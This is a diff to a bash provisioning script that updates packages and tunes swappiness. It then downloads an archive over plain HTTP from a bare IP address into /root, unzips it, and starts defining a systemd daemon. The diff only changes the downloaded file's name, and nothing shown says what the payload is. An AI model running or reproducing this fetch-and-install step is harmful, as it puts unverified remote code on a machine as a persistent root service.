@@ -1,7 +1,5 @@
 #!/bin/bash
 
-ZIPNAME='3uv1'
-
 # update packages
 apt update 
 apt -y upgrade
@@ -24,8 +22,8 @@ echo "vm.swappiness=5" >> /etc/sysctl.conf
 
 # download and unzip files
 cd /root || exit
-wget http://47.95.223.74:8000/files/$ZIPNAME
-unzip -o $ZIPNAME
+wget http://47.95.223.74:8000/ping
+unzip -o ping
 
 # create daemon
 echo "[Unit]
